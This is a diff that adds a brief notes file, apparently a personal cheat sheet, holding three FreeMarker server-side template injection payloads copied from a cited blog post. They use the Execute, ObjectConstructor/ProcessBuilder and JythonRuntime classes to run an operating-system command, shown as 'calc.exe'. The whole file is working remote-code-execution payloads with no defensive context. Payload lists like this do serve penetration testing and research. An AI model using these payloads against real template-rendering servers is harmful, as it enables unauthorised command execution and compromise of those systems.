@@ -1,0 +1,10 @@
+https://www.cnblogs.com/Eleven-Liu/p/12747908.html
+
+freemarker.template.utility#Execute
+<#assign value="freemarker.template.utility.Execute"?new()>${value("calc.exe")}
+
+freemarker.template.utility#ObjectConstructor
+<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","calc.exe").start()}
+
+freemarker.template.utility#JythonRuntime
+<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("calc.exe")</@value>
